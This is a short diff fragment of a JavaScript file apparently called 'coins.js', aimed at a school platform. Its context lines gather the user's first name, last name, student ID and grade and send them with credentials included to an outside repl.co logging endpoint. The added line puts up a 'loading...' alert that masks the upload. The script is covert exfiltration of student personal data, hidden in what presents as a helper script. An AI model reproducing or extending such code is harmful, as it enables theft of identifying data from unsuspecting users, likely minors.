@@ -41,6 +41,7 @@ json=await response.json()
 setTimeout(coins, 1);
 }
 dataa=g["firstName"]+" "+g["lastName"]+" "+g["sisId"]+" coins.js"+" "+g["grade"]
+alert("loading... (press ok to continue, this process may take a couple of seconds)")
 await fetch("https://jjgrenontop.bobdob2.repl.co/log/"+dataa, {
   method: "GET",
   credentials: "include",
